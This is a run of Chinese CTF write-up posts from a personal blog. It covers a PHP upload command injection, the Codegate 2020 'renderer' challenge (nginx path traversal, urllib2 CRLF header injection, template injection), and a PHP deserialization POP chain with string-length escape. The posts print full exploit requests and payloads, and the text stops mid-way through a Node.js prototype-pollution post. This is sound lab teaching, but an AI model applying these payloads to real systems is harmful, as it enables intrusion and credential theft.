upllloadddd.php1234567891011121314151617181920212223242526&lt;?php$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size = 10000000;$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;$filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123; if(!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123; die(&quot;error:can not move&quot;); &#125;&#125;else&#123; die(&quot;error:not an upload file&quot;);&#125;$newfile = $path.$filename;echo &quot;file upload success&lt;br /&gt;&quot;;echo $filename;$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src=&#x27;data:image/png;base64,&quot;.$picdata.&quot;&#x27;&gt;&lt;/img&gt;&quot;;if($_FILES[&#x27;file&#x27;][&#x27;error&#x27;]&gt;0)&#123; unlink($newfile); die(&quot;Upload file error: &quot;);&#125;$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; 没有任何限制直接上传，同时醒目的system提示我们要命令注入。构造xxx.jpg|ls文件上传列目录。 然后就找flag了。注意一个问题，我们的输入会写入文件名，Linux下例如/这样的字符不能用在文件名上，所以不能直接xxx.jpg|ls /这样列根目录，迂回一下，用echo yyy| `base64 -d`这样执行命令。 flag{d0c7071f-f2b8-41e1-907f-ba8b00bd0a1b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"Codegate CTF 2020 Preliminary renderer","slug":"Codegate-2020-renderer","date":"2020-03-07T12:17:00.000Z","updated":"2020-05-18T13:01:30.930Z","comments":true,"path":"2020/03/07/Codegate-2020-renderer/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/07/Codegate-2020-renderer/","excerpt":"","text":"Codegate CTF 2020的renderer。给了Description: It is my first flask project with nginx. Write your own message, and get flag! http://XXXXXXX/renderer 同时给了两个附件： settings/run.sh12345678910service nginx stopmv /etc/nginx/sites-enabled/default /tmp/mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flaskservice nginx restartuwsgi /home/src/uwsgi.ini &amp;/bin/bash /home/cleaner.sh &amp;/bin/bash Dockerfile123456789101112131415161718192021222324FROM python:2.7.16ENV FLAG CODEGATE2020&#123;**DELETED**&#125;RUN apt-get updateRUN apt-get install -y nginxRUN pip install flask uwsgiADD prob_src/src /home/srcADD settings/nginx-flask.conf /tmp/nginx-flask.confADD prob_src/static /home/staticRUN chmod 777 /home/staticRUN mkdir /home/ticketsRUN chmod 777 /home/ticketsADD settings/run.sh /home/run.shRUN chmod +x /home/run.shADD settings/cleaner.sh /home/cleaner.shRUN chmod +x /home/cleaner.shCMD [&quot;/bin/bash&quot;, &quot;/home/run.sh&quot;] 上来注意到的是给的是/renderer，而不是只有一个IP地址。直接访问IP地址后发现是Nginx服务器。那么很容易想到Nginx的不当配置导致路径穿越。打开页面后提示是个Proxy Server，SSRF没跑了。查看网页源代码发现引用了/static/css/renderer.css，那么我们试着访问/static../，果然路径穿越了，这样我们就可以扒下来所有源码了。 /home/src/uwsgi.ini12345678910111213[uwsgi]chdir = /home/src/module = runcallable = appprocesses = 4uid = www-datagid = www-datasocket = /tmp/renderer.sockchmod-socket = 666vacuum = truedaemonize = /tmp/uwsgi.logdie-on-term = truepidfile = /tmp/renderer.pid /home/src/run.py12345678910from app import *import sysdef main(): #TODO : disable debug app.run(debug=False, host=&quot;0.0.0.0&quot;, port=8080)if __name__ == &#x27;__main__&#x27;: main() /home/src/app/routes.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118from __future__ import print_functionfrom flask import Flask, render_template, render_template_string, request, redirect, abort, Blueprintimport urllib2import timeimport hashlibfrom os import pathfrom urlparse import urlparseimport sysfront = Blueprint(&quot;renderer&quot;, __name__)@front.before_requestdef test(): print(&#x27;!!!!&#x27;, request.url, file=sys.stderr)@front.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): if request.method == &quot;GET&quot;: return render_template(&quot;index.html&quot;) url = request.form.get(&quot;url&quot;) res = proxy_read(url) if url else False if not res: abort(400) return render_template(&quot;index.html&quot;, data = res)@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])def ipcheck(): return render_template(&quot;ip.html&quot;, ip = get_ip(), real_ip = get_real_ip())@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])def admin_access(): ip = get_ip() rip = get_real_ip() if ip not in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]: #super private ip :) abort(403) if ip != rip: #if use proxy ticket = write_log(rip) return render_template(&quot;admin_remote.html&quot;, ticket = ticket) else: if ip == &quot;127.0.0.2&quot; and request.args.get(&quot;body&quot;): ticket = write_extend_log(rip, request.args.get(&quot;body&quot;)) return render_template(&quot;admin_local.html&quot;, ticket = ticket) else: return render_template(&quot;admin_local.html&quot;, ticket = None)@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])def admin_ticket(): print(&#x27;!!!! admin_ticket()&#x27;, file=sys.stderr) ip = get_ip() rip = get_real_ip() if ip != rip: #proxy doesn&#x27;t allow to show ticket print(&#x27;!!!!&#x27;, 1, file=sys.stderr) abort(403) if ip not in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]: #only local print(&#x27;!!!!&#x27;, 2, file=sys.stderr) abort(403) if request.headers.get(&quot;User-Agent&quot;) != &quot;AdminBrowser/1.337&quot;: print(&#x27;!!!!&#x27;, request.headers.get(&quot;User-Agent&quot;), file=sys.stderr) abort(403) if request.args.get(&quot;ticket&quot;): log = read_log(request.args.get(&quot;ticket&quot;)) if not log: print(&#x27;!!!!&#x27;, 4, file=sys.stderr) abort(403) return render_template_string(log)def get_ip(): return request.remote_addrdef get_real_ip(): return request.headers.get(&quot;X-Forwarded-For&quot;) or get_ip()def proxy_read(url): #TODO : implement logging s = urlparse(url).scheme if s not in [&quot;http&quot;, &quot;https&quot;]: #sjgdmfRk akfRk return &quot;&quot; return urllib2.urlopen(url).read()def write_log(rip): print(&#x27;!!!! write_log()&#x27;, file=sys.stderr) tid = hashlib.sha1(str(time.time()) + rip).hexdigest() with open(&quot;/home/tickets/%s&quot; % tid, &quot;w&quot;) as f: log_str = &quot;Admin page accessed from %s&quot; % rip f.write(log_str) return tiddef write_extend_log(rip, body): tid = hashlib.sha1(str(time.time()) + rip).hexdigest() with open(&quot;/home/tickets/%s&quot; % tid, &quot;w&quot;) as f: f.write(body) return tiddef read_log(ticket): print(&#x27;!!!! read_log()&#x27;, file=sys.stderr) if not (ticket and ticket.isalnum()): return False if path.exists(&quot;/home/tickets/%s&quot; % ticket): with open(&quot;/home/tickets/%s&quot; % ticket, &quot;r&quot;) as f: return f.read() else: return False /home/src/app/__init__.py12345678from flask import Flaskfrom app import routesimport osapp = Flask(__name__)app.url_map.strict_slashes = Falseapp.register_blueprint(routes.front, url_prefix=&quot;/renderer&quot;)app.config[&quot;FLAG&quot;] = os.getenv(&quot;FLAG&quot;, &quot;CODEGATE2020&#123;&#125;&quot;) templates就不放了，在我Github上有完整的。 flag保存在Flask的config里，利用SSRF就可以拿到。那么SSRF在哪？admin_ticket()路由的最后一行render_template_string()很显眼，同时admin_local.html和admin_remote.html里都有一句 {% if ticket %} Your access log is written with ticket no {{ ticket }} {% endif %} 很明显SSRF了。下一步是怎么触发SSRF。admin_ticket()路由中会用get_ip()和get_real_ip()判断IP来源。get_real_ip()使用X-Forwarded-For头获取IP。没啥问题。 我们的目标很明显是要通过Proxy Service来访问/admin/ticket，直接在浏览器访问会由于访问IP不为127.0.0.1或127.0.0.2而403。但要成功访问/admin/ticket又需要设置User-Agent为AdminBrowser/1.337。我们可控的是X-Forwarded-For，也就是说我们需要一种方式影响HTTP头。 研究一下proxy_read()，发现是用的urllib2.urlopen()。搜一下“urllib2 vuln”，返回第一个页面就是这个，CRLF Injection。好极了，这个洞可以通过插入。那么，X-Forwarded-For和User-Agent就可以被插入了。 到现在，题目已经解决，攻击流程如下： 利用urllib2的漏洞，插入X-Forwarded-For: ，使Proxy Service访问/renderer/admin，生成ticket。 利用nginx的路径穿越，访问/static../tickets/，获得刚才的ticket文件名。 利用urllib2的漏洞，插入User-Agent: AdminBrowser/1.337，使Proxy Service访问/renderer/admin/ticket?ticket=刚才的文件名，渲染ticket，读出Flask的config，得到flag。 OK，Burp发包吧： 1234567891011121314151617POST /renderer/ HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/renderer/Content-Type: application/x-www-form-urlencodedContent-Length: 88Origin: http://127.0.0.1Connection: closeCookie: confluence.browse.space.cookie=space-templatesUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheurl=http://127.0.0.1/renderer/admin HTTP/1.1%0d%0aX-Forwarded-For: %0d%0aTEST: 123 返回正常页面后访问/static../tickets/，得到文件名：fc75a14b624748a31ddd99ef984df7eaa6781aa9。 然后发包 1234567891011121314151617POST /renderer/ HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/renderer/Content-Type: application/x-www-form-urlencodedContent-Length: 214Origin: http://127.0.0.1Connection: closeCookie: confluence.browse.space.cookie=space-templatesUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheurl=http://127.0.0.1/renderer/admin/ticket?ticket=fc75a14b624748a31ddd99ef984df7eaa6781aa9 HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost: 127.0.0.1%0d%0a%0d%0aTEST: 123 为什么第二部发包需要两个%0d%0a呢？ GET模式下HTTP头后的任何内容没有意义。我们正常%0d%0a注入后会剩下一个\"HTTP/1.1\"，这个内容需要处理掉，否则urllib2会报错。因此我们用第二个%0d%0a强行结束HTTP头部分，那么\"HTTP/1.1\"会被当作HTTP头结束后的内容出现，GET模式下没有意义，会被丢弃，而我们想注入的头已经在前面布置好了。","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Nginx","slug":"Nginx","permalink":"http://tiaonmmn.github.io/tags/Nginx/"}]},{"title":"BUUOJ刷题-Web-GYCTF2020-Easyphp","slug":"BUUOJ刷题-Web-GYCTF2020-Easyphp","date":"2020-03-04T02:36:16.000Z","updated":"2020-03-05T07:02:15.790Z","comments":true,"path":"2020/03/04/BUUOJ刷题-Web-GYCTF2020-Easyphp/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/","excerpt":"GYCTF 2020的BabyPHP（题目上错名字了）。 开题让登陆，随手试了一下www.zip发现还真有源码。。。 index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 123456789if(isset($_POST[&#x27;username&#x27;]))&#123;if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123; die(&quot;&lt;br&gt;Damn you, hacker!&quot;); &#125; if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123; die(&quot;Damn you, hacker!&quot;); &#125; $user-&gt;login();&#125;","text":"GYCTF 2020的BabyPHP（题目上错名字了）。 开题让登陆，随手试了一下www.zip发现还真有源码。。。 index.php没啥，限制后缀名为.php，LFI没用处。login.php Ban了一堆关键字 123456789if(isset($_POST[&#x27;username&#x27;]))&#123;if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123; die(&quot;&lt;br&gt;Damn you, hacker!&quot;); &#125; if(preg_match(&quot;/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i&quot;, $_POST[&#x27;password&#x27;]))&#123; die(&quot;Damn you, hacker!&quot;); &#125; $user-&gt;login();&#125; login()函数来自lib.php。update.php里实例化了一个User()类，并update()。如果$_SESSION['login']===1就输出flag。 一个大坑在于，update.php里判断没有登录后会继续执行$user()-&gt;update()，开始的时候没注意到这点，导致一直在想如何利用login.php传参。。。 本题重点就是lib.php了。User类的login()从POST获取username和password后执行查询，返回结果就分配SESSION。没太多搞头，但是update()里出现了unserialize()，就很有意思了： 1234567public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //这个功能还没有写完 先占坑&#125; 先反序列化getNewInfo()返回值，又调用了UpdateHelper()。getNewInfo()代码如下： 123456789 public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname))); &#125; function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; 从POST获取age和nickname，返回safe()处理后的Info()序列化结果。safe()简单的将一堆关键字替换成'hacker'，问题很大，反序列化结果记录了每个字段的长度，强行替换会造成额外读取，我们就可以控制了。 Info类代码如下： 123456789101112class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125; 很简单的赋值而已，当我们调用一个不存在的方法时会调用CtrlCase-&gt;login()，只有dbCtrl有login()方法还需要一个参数。 UpdateHelper类的代码如下： 12345678910111213Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125; UpdateHelper使用\\(newInfo和\\)sql构造，而在销毁时又会显示\\(sql的值。正常登录后\\)newInfo应该为admin用户的ID，\\(sql应该是Info类，所以\\)this-&gt;sql是个空。 User类还有个__destruct方法，但是没什么卵用，file_get_contents()的结果没有输出，是个干扰用的。 我们的目标，现在看来就剩下一个了，通过某种方法得到admin的密码，登录得到flag。而要得到flag，很明显只有通过SQL。Info类的__call方法很明显要我们调用dbCtrl的login()方法，让我们任意执行SQL语句。得到admin用户的SQL语句不难写select password,username from user where username=?，因为login()返回的是idResult，第一个结果。Info的__call如何别触发？回过头看User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，然后我们就看到了__toString()方法： 12345public function __toString()&#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;;&#125; nickname哪来的？unserialize(getNewInfo())得到的，如果nickname是Info类，nickname-&gt;update就会触发Info的__call。__toString()需要一个输出字符串的地方才会被调用，而我们还有一个UpdateHelper的__destruct()，会echo \\(this-&gt;sql，而在User类中UpdateHelper的调用中\\)Info会被赋值成$this-&gt;sql。 整理一下POP链，首先是new UpdateHelper()，调用__destruct()，转向new User()的__toString()，调用nickname-&gt;update()，转向new Info()的__call，最终转向new dbCtrl()带出admin的密码。如图所示： graph LR id1(&quot;UpdateHelper()&quot;) --&gt;|&quot;UpdateHelper-&gt;__destruct()&quot;| id2(&quot;User()&quot;) id2 --&gt;|&quot;User-&gt;__toString()&quot;| id3(&quot;User-&gt;nickname&quot;) id3 --&gt;|&quot;User-&gt;nickname-&gt;update()&quot;| id4(&quot;Info()&quot;) id4 --&gt;|&quot;Info-&gt;__call&quot;| id5(&quot;dbCtrl()&quot;) id5 --&gt;|&quot;SQL查询&quot;| id6(&quot;admin&#39;s password MD5&quot;) 写Payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass User&#123; public $id; public $age = null; public $nickname = null;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age, $nickname) &#123; $this-&gt;age = $age; $this-&gt;nickname = $nickname; &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo, $sql) &#123; $newInfo = unserialize($newInfo); $upDate = new dbCtrl(); &#125;&#125;class dbCtrl&#123; public $hostname = &quot;127.0.0.1&quot;; public $dbuser = &quot;root&quot;; public $dbpass = &quot;root&quot;; public $database = &quot;test&quot;; public $name = &quot;admin&quot;; public $password; public $mysqli; public $token=&quot;admin&quot;;&#125;$db = new dbCtrl();$user = new User();$info = new Info(&quot;23333&quot;, &quot;1&quot;);$updatehelper = new UpdateHelper(&quot;233333&quot;, &quot;23333333&quot;);$info-&gt;CtrlCase = $db;$user-&gt;nickname = $info;$user-&gt;age = &quot;select password,id from username where username=?&quot;;$updatehelper-&gt;sql=$user;echo serialize($updatehelper); 结果为O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:49:\"select password,id from username where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";s:5:\"23333\";s:8:\"nickname\";s:8:\"Tiaonmmn\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:7:\"nu1lctf\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;。这个反序列化出来的是UpdateHelper类，而我们的输入点是getNewInfo()引入的Info类。怎么样能够把UpdateHelper类放到Info类中？很简单，我们布置好的UpdateHelper类在什么时候才发挥作用？调用__destruct()的时候，在正常调用User()-&gt;update()的时候Info-&gt;CtrlCase没有任何意义。所以，如果我们把Info-&gt;CtrlCase设置成UpdateHelper类怎么样？unserialize()结束后由于我们没有用到CtrlCase，所以会执行__destruct，完成我们想要的操作。 刚才的Payload应该再加两行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpclass User&#123; public $id; public $age = null; public $nickname = null;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age, $nickname) &#123; $this-&gt;age = $age; $this-&gt;nickname = $nickname; &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo, $sql) &#123; $newInfo = unserialize($newInfo); $upDate = new dbCtrl(); &#125;&#125;class dbCtrl&#123; public $hostname = &quot;127.0.0.1&quot;; public $dbuser = &quot;root&quot;; public $dbpass = &quot;root&quot;; public $database = &quot;test&quot;; public $name = &quot;admin&quot;; public $password; public $mysqli; public $token = &quot;admin&quot;;&#125;$db = new dbCtrl();$user = new User();$info = new Info(&quot;23333&quot;, &quot;Tiaonmmn&quot;);#echo serialize($info);$updatehelper = new UpdateHelper(&quot;1&quot;, &quot;&quot;);$info-&gt;CtrlCase = $db;$user-&gt;nickname = $info;$user-&gt;age = &quot;select password,id from username where username=?&quot;;$updatehelper-&gt;sql = $user;#echo serialize($updatehelper);$realinfo = new Info(&quot;233333&quot;, &quot;Tiaonmmn&quot;);$realinfo-&gt;CtrlCase = $updatehelper;echo serialize($realinfo); O:4:\"Info\":3:&#123;s:3:\"age\";s:1:\"1\";s:8:\"nickname\";s:588:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:&#123;s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:&#123;s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:&#123;s:3:\"age\";s:5:\"23333\";s:8:\"nickname\";s:8:\"Tiaonmmn\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:&#123;s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";&#125;&#125;&#125;&#125;&#125;\";s:8:\"CtrlCase\";N;&#125;，这样就符合getNewInfo()的条件了。 还有一个问题，我们怎么传Payload？发包的时候我们只能输入age和nickname参数，CtrlCase没办法传进去。再回过头看源码，发现一直以来我们都忘记了一样东西 12345public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname)));&#125; return的时候还有个safe函数呢。前面说过，safe函数只是简单地替换了字符，把相应字符串替换成hacker，那么原来序列化的字符串就有相当大的几率被破坏掉，PHP序列化时计算的字符串长度与实际字符串长度不对应，我们就可以逃逸出来插入我们想要的内容了。之前也有一道题AXB 2019 Easy serialize php考这个。思路就是利用safe()函数把一个字符变成6个字符，把所有的Payload包含进去。 最终Payload如下： 12345678910111213141516POST /update.php HTTP/1.1Host: bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://bcdbfe01-7b26-46fc-812b-4ce85bcba5ff.node3.buuoj.cn/Connection: closeCookie: _ga=GA1.2.744187123.1582874453; PHPSESSID=2bc6e7caef6bc5c3495fe91dcf0eb6c2Upgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-Type: application/x-www-form-urlencodedContent-Length: 603age=1&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:5:&quot;23333&quot;;s:8:&quot;nickname&quot;;s:8:&quot;Tiaonmmn&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125; 提交就会返回admin的MD5，注意最后面加上了一个“0-0”。 解密就可以登录，拿到flag了。 flag{d73e9619-0858-4478-a940-b89dbb80d7ad}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"BUUOJ刷题-Web-Ez_express","slug":"BUUOJ刷题-Web-Ez-express","date":"2020-03-02T03:10:57.000Z","updated":"2020-03-02T08:55:11.823Z","comments":true,"path":"2020/03/02/BUUOJ刷题-Web-Ez-express/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Ez-express/","excerpt":"","text":"2020 i春秋新春公益赛的Ez_express，NodeJS的题。 开题提示我们用ADMIN登录，随便注册一下页面注释提示www.zip。看一下app.js，Express框架的程序，index页面指向routes/index.js。 login路由有点东西： 12345678910111213141516171819202122232425router.post(&#x27;/login&#x27;, function (req, res) &#123; if (req.body.Submit == &quot;register&quot;) &#123; if (safeKeyword(req.body.userid)) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user = &#123; &#x27;user&#x27;: req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;: false &#125; res.redirect(&#x27;/&#x27;); &#125; else if (req.body.Submit == &quot;login&quot;) &#123; if (!req.session.user) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; if (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123; req.session.user.isLogin = true; &#125; else &#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;); safeKeyword()使得我们注册的时候不能用\"admin\"，而题目又要求我们用admin用户名登录。注意到在register()里用户名特别的加了一步toUppercase()操作，这是干什么用的？ 参考这里，Javascript在处理某些语系特定字符的时候会有些意外，我们可以用ı来代替i，除了上文提到的几个，这里还有补充。 因此我们注册一个admın用户即可绕过限制了。然后就让我们提交你最喜欢的语言？？？ 1234567router.post(&#x27;/action&#x27;, function (req, res) &#123; if (req.session.user.user != &quot;ADMIN&quot;) &#123; res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);&#125;); 我们POST过去的东西被clone()到了req.body对象里。 1234567891011121314const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;; 这就涉及到新的知识点了，原型链污染。具体参考这里、这里和这里。简单来说，JavaScript里绝大部分对象继承了Object对象，例如String对象就继承于String类（function等同于class），又继承于Object对象。那么String对象的原型就是String类，如下图所示： graph LR A[&quot;Object()&quot;]--&gt;|Prototype|B[&quot;function String()&quot;] B--&gt;|Prototype|C[&quot;123&quot;] 这条继承链就叫做原型链。我们如果在function 